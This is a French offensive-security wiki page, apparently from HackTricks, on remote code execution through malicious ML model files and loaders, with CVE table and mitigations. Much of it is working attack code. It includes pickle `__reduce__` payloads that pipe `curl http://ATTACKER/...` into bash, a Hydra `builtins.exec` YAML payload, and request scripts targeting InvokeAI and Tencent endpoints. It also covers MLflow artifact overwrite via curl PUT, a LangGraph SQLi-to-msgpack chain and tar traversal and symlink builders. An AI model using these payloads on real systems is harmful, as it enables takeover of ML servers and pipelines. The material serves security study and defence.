# RCE via les modèles

{{#include ../banners/hacktricks-training.md}}

## Chargement de modèles pour obtenir une RCE

Les modèles de Machine Learning sont généralement partagés dans différents formats, tels que ONNX, TensorFlow, PyTorch, etc. Ils peuvent être chargés sur les machines des développeurs ou sur des systèmes de production pour être utilisés. En général, les modèles ne devraient pas contenir de code malveillant, mais dans certains cas, ils peuvent permettre d’exécuter du code arbitraire sur le système, soit comme fonctionnalité prévue, soit à cause d’une vulnérabilité dans la bibliothèque de chargement des modèles.

Le tableau suivant présente des vulnérabilités représentatives de cette catégorie :

| **Framework / outil**        | **Vulnérabilité (CVE si disponible)**                                                    | **Vecteur de RCE**                                                                                                                           | **Références**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Désérialisation non sécurisée dans* `torch.load` **(CVE-2025-32434)**                                                              | Un pickle malveillant dans un checkpoint de modèle entraîne l’exécution de code (en contournant la protection `weights_only`)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | Un SSRF associé au téléchargement d’un modèle malveillant entraîne l’exécution de code ; RCE par désérialisation Java dans l’API de gestion                                        | |
| **NVIDIA Merlin Transformers4Rec** | Désérialisation non sécurisée d’un checkpoint via `torch.load` **(CVE-2025-23298)**                                           | Un checkpoint non fiable déclenche un pickle reducer pendant `load_model_trainer_states_from_checkpoint` → exécution de code dans le worker ML            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis checkpointers) | Injection SQL + hook d’extension MessagePack non sécurisé **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | La clé `filter` contrôlée par l’utilisateur injecte une syntaxe SQL/JSON-path ; `UNION SELECT` fabrique une fausse ligne de checkpoint, puis la désérialisation `msgpack` importe et appelle du code Python choisi par l’attaquant | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (YAML non sécurisé) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Le chargement d’un modèle depuis YAML utilise `yaml.unsafe_load` (exécution de code) <br> Le chargement d’un modèle avec une couche **Lambda** exécute du code Python arbitraire          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (analyse TFLite)                                                                                          | Un modèle `.tflite` conçu à cet effet déclenche un dépassement d’entier → corruption du tas (RCE potentielle)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Le chargement d’un modèle via `joblib.load` exécute un pickle contenant un payload `__reduce__` de l’attaquant                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (`np.load` non sécurisé) *contestée*                                                                              | Par défaut, `numpy.load` autorisait les tableaux d’objets pickle – un fichier `.npy/.npz` malveillant déclenche l’exécution de code                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (traversée de répertoires) <br> **CVE-2024-5187** (traversée de tar)                                                    | Le chemin des poids externes d’un modèle ONNX peut sortir du répertoire (lecture de fichiers arbitraires) <br> Une archive tar de modèle ONNX malveillante peut écraser des fichiers arbitraires (et entraîner une RCE) | |
| ONNX Runtime (risque de conception)  | *(Pas de CVE)* Opérations personnalisées / flux de contrôle ONNX                                                                                    | Un modèle utilisant un opérateur personnalisé nécessite le chargement du code natif de l’attaquant ; des graphes de modèles complexes exploitent la logique pour exécuter des calculs non prévus   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (traversée de chemins)                                                                                          | L’utilisation de l’API de chargement de modèles avec `--model-control` activé permet une traversée de chemins relatifs pour écrire des fichiers (par exemple, écraser `.bashrc` pour obtenir une RCE)    | |
| **GGML (format GGUF)**      | **CVE-2024-25664 … 25668** (plusieurs débordements de tas)                                                                         | Un fichier de modèle GGUF malformé provoque des débordements de tampon dans le tas de l’analyseur, permettant l’exécution de code arbitraire sur le système de la victime                     | |
| **Keras (anciens formats)**   | *(Pas de nouvelle CVE)* Ancien modèle Keras H5                                                                                         | Un modèle HDF5 (`.h5`) malveillant contenant une couche Lambda exécute toujours du code au chargement (le mode `safe_mode` de Keras ne couvre pas l’ancien format – « attaque par rétrogradation ») | |
| **Autres** (général)        | *Faille de conception* – sérialisation Pickle                                                                                         | De nombreux outils ML (par exemple, les formats de modèle basés sur pickle ou `pickle.load` de Python) exécutent le code arbitraire intégré aux fichiers de modèle, sauf mesure d’atténuation | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Métadonnées non fiables transmises à `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Les métadonnées/configurations de modèle contrôlées par l’attaquant définissent `_target_` sur un callable arbitraire (par exemple, `builtins.exec`) → exécuté au chargement, même avec des formats « sûrs » (`.safetensors`, `.nemo`, `config.json` du dépôt) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

De plus, certains modèles reposent sur le pickle de Python, comme ceux utilisés par [PyTorch](https://github.com/pytorch/pytorch/security), et peuvent servir à exécuter du code arbitraire sur le système s’ils ne sont pas chargés avec `weights_only=True`. Tout modèle basé sur pickle peut donc être particulièrement vulnérable à ce type d’attaque, même s’il ne figure pas dans le tableau ci-dessus.

### Métadonnées Hydra → RCE (fonctionne même avec safetensors)

`hydra.utils.instantiate()` importe et appelle n’importe quel `_target_` pointé dans un objet de configuration/métadonnées. Lorsque des bibliothèques comme Hugging Face Transformers transmettent des **métadonnées de modèle non fiables** à `instantiate()`, un attaquant peut fournir un callable et des arguments qui s’exécutent immédiatement lors du chargement du modèle (sans pickle).<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

Exemple de payload (fonctionne dans `model_config.yaml` de `.nemo`, `config.json` d’un dépôt, ou `__metadata__` dans `.safetensors`) :

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

Points clés :
- Déclenché avant l’initialisation du modèle dans `restore_from/from_pretrained` de NeMo, les coders HuggingFace de uni2TS et les loaders de FlexTok.
- La block-list de chaînes de Hydra peut être contournée via des chemins d’import alternatifs (p. ex., `enum.bltns.eval`) ou des noms résolus par l’application (p. ex., `nemo.core.classes.common.os.system` → `posix`).<sup>[[14]](#references)</sup>
- FlexTok analyse également des métadonnées sous forme de chaînes avec `ast.literal_eval`, ce qui permet un DoS (explosion de la consommation CPU/mémoire) avant l’appel à Hydra.

### 🆕  RCE dans InvokeAI via `torch.load` (CVE-2024-12029)

`InvokeAI` est une interface web open source populaire pour Stable-Diffusion. Les versions **5.3.1 – 5.4.2** exposent le point de terminaison REST `/api/v2/models/install`, qui permet aux utilisateurs de télécharger et de charger des modèles depuis des URL arbitraires.<sup>[[1]](#references)</sup>

En interne, le point de terminaison finit par appeler :

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

When le fichier fourni est un **checkpoint PyTorch (`*.ckpt`)**, `torch.load` effectue une **désérialisation pickle**. Comme le contenu provient directement d’une URL contrôlée par l’utilisateur, un attaquant peut intégrer un objet malveillant doté d’une méthode `__reduce__` personnalisée dans le checkpoint ; cette méthode est exécutée **pendant la désérialisation**, ce qui entraîne une **remote code execution (RCE)** sur le serveur InvokeAI.

La vulnérabilité a reçu l’identifiant **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Déroulement de l'exploitation

1. Créez un checkpoint malveillant :

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. Hébergez `payload.ckpt` sur un serveur HTTP que vous contrôlez (par ex. `http://ATTACKER/payload.ckpt`).
3. Déclenchez le endpoint vulnérable (aucune authentification requise) :

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. Lorsque InvokeAI télécharge le fichier, il appelle `torch.load()` → le gadget `os.system` s’exécute et l’attaquant obtient l’exécution de code dans le contexte du processus InvokeAI.

Exploit prêt à l’emploi : le module **Metasploit** `exploit/linux/http/invokeai_rce_cve_2024_12029` automatise l’ensemble du processus.<sup>[[3]](#references)</sup>

#### Conditions

•  InvokeAI 5.3.1-5.4.2 (valeur par défaut du flag **scan** : **false**)
•  `/api/v2/models/install` accessible à l’attaquant
•  Le processus dispose des permissions nécessaires pour exécuter des commandes shell

#### Mesures d’atténuation

* Mettre à niveau vers **InvokeAI ≥ 5.4.3** – le correctif définit `scan=True` par défaut et effectue une analyse anti-malware avant la désérialisation.<sup>[[2]](#references)</sup>
* Lors du chargement programmatique de checkpoints, utiliser `torch.load(file, weights_only=True)` ou le nouveau helper [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).
* Appliquer des listes d’autorisation / signatures aux sources des modèles et exécuter le service avec le principe du moindre privilège.

> ⚠️ N’oubliez pas que **tout** format basé sur Python pickle (y compris de nombreux fichiers `.pt`, `.pkl`, `.ckpt`, `.pth`) est intrinsèquement dangereux à désérialiser depuis des sources non fiables.

---

Exemple de mesure d’atténuation ponctuelle si vous devez continuer à exécuter d’anciennes versions d’InvokeAI derrière un reverse proxy :

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 RCE dans NVIDIA Merlin Transformers4Rec via `torch.load` non sécurisé (CVE-2025-23298)

Transformers4Rec de NVIDIA (qui fait partie de Merlin) exposait un chargeur de checkpoint non sécurisé qui appelait directement `torch.load()` sur des chemins fournis par l’utilisateur. Comme `torch.load` s’appuie sur Python `pickle`, un checkpoint contrôlé par un attaquant peut exécuter du code arbitraire via un reducer pendant la désérialisation.<sup>[[5]](#references)</sup>

Chemin vulnérable (avant le correctif) : `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Pourquoi cela mène à une RCE : en Python, un objet pickle peut définir un reducer (`__reduce__`/`__setstate__`) qui renvoie un appelable et des arguments. L’appelable est exécuté pendant la désérialisation. Si un tel objet se trouve dans un checkpoint, son code s’exécute avant l’utilisation des poids.

Exemple minimal de checkpoint malveillant :

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

Vecteurs de livraison et rayon d’impact :
- Checkpoints/modèles piégés partagés via des repos, des buckets ou des registres d’artefacts
- Pipelines automatisés de reprise/déploiement qui chargent automatiquement les checkpoints
- L’exécution a lieu dans les workers d’entraînement/d’inférence, souvent avec des privilèges élevés (par ex., root dans des conteneurs)

Correctif : le commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) a remplacé l’appel direct à `torch.load()` par un désérialiseur restreint, à liste d’autorisation, implémenté dans `transformers4rec/utils/serialization.py`. Le nouveau loader valide les types/champs et empêche l’appel de fonctions arbitraires pendant le chargement.<sup>[[7]](#references)</sup>

Recommandations défensives spécifiques aux checkpoints PyTorch :
- Ne désérialisez pas de données non fiables avec pickle. Privilégiez des formats non exécutables comme [Safetensors](https://huggingface.co/docs/safetensors/index) ou ONNX lorsque c’est possible.
- Si vous devez utiliser la sérialisation PyTorch, assurez-vous que `weights_only=True` (pris en charge par les versions récentes de PyTorch) est activé, ou utilisez un unpickler personnalisé avec liste d’autorisation, similaire au correctif de Transformers4Rec.<sup>[[4]](#references)</sup>
- Vérifiez la provenance/les signatures des modèles et exécutez la désérialisation dans un sandbox (seccomp/AppArmor ; utilisateur non-root ; système de fichiers restreint et aucune sortie réseau).
- Surveillez l’apparition de processus enfants inattendus dans les services ML au chargement des checkpoints ; tracez l’utilisation de `torch.load()`/`pickle`.

Références au POC et aux versions vulnérable/corrigée :<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- Loader vulnérable avant le correctif : https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- POC de checkpoint malveillant : https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Loader après le correctif : https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## Exemple – création d’un modèle PyTorch malveillant

- Créer le modèle :

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- Charger le modèle :

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

FaceDetection-DSFD de Tencent expose un endpoint `resnet` qui désérialise des données contrôlées par l’utilisateur. ZDI a confirmé qu’un attaquant distant peut pousser une victime à charger une page ou un fichier malveillant, lui faire envoyer un blob sérialisé spécialement conçu à cet endpoint et déclencher la désérialisation en tant que `root`, ce qui entraîne une compromission totale.

Le déroulement de l’exploit reprend les techniques classiques d’exploitation de pickle :

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

Tout gadget accessible pendant la désérialisation (constructeurs, `__setstate__`, callbacks de framework, etc.) peut être weaponized de la même manière, que le transport soit HTTP, WebSocket ou un fichier déposé dans un répertoire surveillé.



### LangGraph checkpointer SQLi → MessagePack RCE

Cette chaîne d’attaque est intéressante, car l’attaquant **n’a pas besoin de téléverser un fichier de modèle malveillant**. À la place, l’application expose une **API de persistance d’agent IA** (`get_state_history(..., filter=...)`) et les données fournies par l’utilisateur atteignent le générateur de requêtes du checkpointer.

#### 1. SQLi structurelle dans les filtres de métadonnées

Un pattern SQLite vulnérable ressemblait à ceci :

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

La valeur est liée ultérieurement, mais `query_key` est concaténé dans la **chaîne du chemin JSON** : un `'` dans la clé du dictionnaire sort de `'$.{query_key}'` et injecte du SQL. La même leçon s’applique aux **chemins JSON, identifiants, opérateurs, champs `LIMIT` et TTL** : les placeholders ne protègent que les valeurs, pas la syntaxe structurelle des requêtes.

#### 2. `UNION SELECT` peut cibler des sinks en aval, pas seulement voler des données

La requête renvoie `type` et les octets sérialisés de `checkpoint`, qui sont ensuite utilisés comme suit :

```python
self.serde.loads_typed((type, checkpoint))
```

Cela signifie qu’une SQLi dans la clause `WHERE` peut injecter une **fausse ligne de résultat** :

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

Si du code analyse, désérialise, écrit ou exécute ultérieurement une colonne sélectionnée, associez ces colonnes à leurs sinks. Dans ce cas, la fausse ligne transforme la SQLi en **désérialisation contrôlée par l’attaquant**.

#### 3. Les hooks d’extension MessagePack non sécurisés équivalent à des gadgets de code

Le chemin `msgpack` de LangGraph utilisait un hook d’extension personnalisé qui décompactait un tuple imbriqué et exécutait :

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

Ainsi, un objet d’extension MessagePack encodant l’équivalent de `("os", "system", "id > /tmp/pwned")` importe `os`, résout `system` et exécute la commande. Lors de l’audit de frameworks d’IA, inspectez les **revivers personnalisés MessagePack/JSON/pickle** pour détecter les imports dynamiques, la réflexion ou la répartition arbitraire vers des callables.

#### 4. Modèle d’audit pratique pour les frameworks d’agents

Examinez toute entrée contrôlée par l’utilisateur qui atteint :
- les API d’historique d’état / mémoire / relecture / liste des checkpoints
- les générateurs de filtres structurés qui produisent du SQL ou des fragments de requête Redis
- les désérialiseurs personnalisés (`pickle`, `msgpack`, hooks d’objet `json`, constructeurs YAML)
- les chemins de récupération qui font confiance aux lignes renvoyées par la couche de persistance

Cette chaîne précise affectait les déploiements LangGraph auto-hébergés utilisant des checkpointers **SQLite** ou **Redis**, lorsque des utilisateurs non fiables pouvaient contrôler `filter`. Les versions corrigées mentionnées dans la divulgation étaient `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+` et `langgraph-checkpoint 4.0.1+`.<sup>[[15]](#references)</sup>

### Écrasement d’artefact MLflow PyFunc menant à une RCE via pickle

Un MLflow PyFunc créé à partir d’un `PythonModel` peut stocker l’objet sérialisé sous le nom `python_model.pkl`. Les métadonnées du modèle désignent `mlflow.pyfunc.model` comme chargeur, et l’implémentation de MLflow utilise ce nom de fichier pour le modèle Python sauvegardé. Par conséquent, un accès en écriture au magasin d’artefacts peut permettre l’exécution de code dans une autre application qui charge ensuite le modèle.<sup>[[17]](#references)[[18]](#references)</sup>

La chaîne utile est **autorisation d’écriture sur l’artefact → remplacer le pickle → faire recharger le modèle par un consommateur d’inférence**. Pour une expérience utilisant une racine `mlflow-artifacts:/...` via proxy, énumérez l’expérience, l’exécution et le chemin de l’artefact du modèle. Le serveur de suivi expose `GET` et `PUT` sur `/api/2.0/mlflow-artifacts/artifacts/<artifact-path>`.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Preserve a copy and confirm the exact object first
curl -u USER:PASS \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  -o original.pkl

# Upload the pickle without curl transforming its bytes
curl -u USER:PASS -X PUT \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  --data-binary @payload.pkl
```

Un reducer minimal peut exécuter une commande dès que le consommateur désérialise l’artefact. Générer le payload avec la version de Python déclarée dans `MLmodel` évite les problèmes de compatibilité.<sup>[[17]](#references)[[20]](#references)</sup>

```python
import os
import pickle

class Payload:
    def __reduce__(self):
        return os.system, ("ping -c 1 ATTACKER",)

with open("payload.pkl", "wb") as f:
    pickle.dump(Payload(), f)
```

Déclenchez l’opération qui **charge le modèle existant**, par exemple une prédiction, un scoring ou un déploiement. Ne relancez pas l’entraînement au préalable, car cela pourrait remplacer l’artefact malveillant par un nouveau modèle. Une erreur de l’application ne réfute pas l’exploitation : le reducer renvoie le code de sortie entier de la commande au lieu d’un modèle utilisable. Commencez par un effet secondaire observable, comme un paquet ICMP ou un callback HTTP, puis remplacez-le par le payload final.<sup>[[20]](#references)</sup>

Lors de l’évaluation, faites la distinction entre l’autorisation de créer un run et celle d’écraser les artefacts appartenant à un autre run. Vérifiez l’authentification et les permissions de mise à jour par run, inspectez les modifications inattendues de `python_model.pkl` et considérez la provenance et l’intégrité du modèle comme faisant partie de la frontière d’exécution. Le code actuel de MLflow permet également de définir `MLFLOW_ALLOW_PICKLE_DESERIALIZATION=false` et recommande d’utiliser des artefacts models-from-code plutôt que de charger des données cloudpickle.<sup>[[18]](#references)[[19]](#references)[[20]](#references)</sup>

## Modèles et Path Traversal

Comme indiqué dans [**cet article de blog**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), la plupart des formats de modèles utilisés par différents frameworks d’IA reposent sur des archives, généralement au format `.zip`. Il est donc peut-être possible d’abuser de ces formats pour mener des attaques Path Traversal et lire des fichiers arbitraires sur le système où le modèle est chargé.<sup>[[16]](#references)</sup>

Par exemple, le code suivant permet de créer un modèle qui créera un fichier dans le répertoire `/tmp` lors de son chargement :

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

Ou, avec le code suivant, vous pouvez créer un modèle qui créera un symlink vers le répertoire `/tmp` lors de son chargement :

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```

### Analyse approfondie : désérialisation des fichiers .keras par Keras et recherche de gadgets

Pour un guide ciblé sur les mécanismes internes de .keras, le RCE via les couches Lambda, le problème d’import arbitraire dans les versions ≤ 3.8 et la découverte de gadgets dans l’allowlist après le correctif, consultez :

{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [Blog OffSec – « CVE-2024-12029 – Désérialisation de données non fiables dans InvokeAI »](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [Commit du correctif InvokeAI 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Documentation du module Metasploit de Rapid7](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – considérations de sécurité pour torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [Blog ZDI – CVE-2025-23298 : obtenir l’exécution de code à distance dans NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [Avis ZDI : ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Commit du correctif Transformers4Rec b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Chargeur vulnérable avant correctif (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [PoC de checkpoint malveillant (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Chargeur après correctif (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Transformers de Hugging Face](https://github.com/huggingface/transformers)
- [12] [Unit 42 – Exécution de code à distance avec les formats et bibliothèques modernes d’IA/ML](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Documentation Hydra instantiate](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Commit de la block-list Hydra (avertissement concernant le RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – De SQLi à RCE : exploiter le checkpointer de LangGraph](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Transformer les bugs Archive Slip en primes de bug bounty de grande valeur pour l’IA/ML](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
- [17] [Avis Snyk et preuve de concept PyFunc – CVE-2024-37054](https://security.snyk.io/vuln/SNYK-PYTHON-MLFLOW-7210300)
- [18] [Code source de MLflow – `model.py` de PyFunc](https://github.com/mlflow/mlflow/blob/master/mlflow/pyfunc/model.py)
- [19] [API REST MLflow – points de terminaison de téléchargement et d’envoi d’artefacts](https://mlflow.org/docs/latest/api_reference/rest-api.html)
- [20] [0xdf – HTB : SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
{{#include ../banners/hacktricks-training.md}}
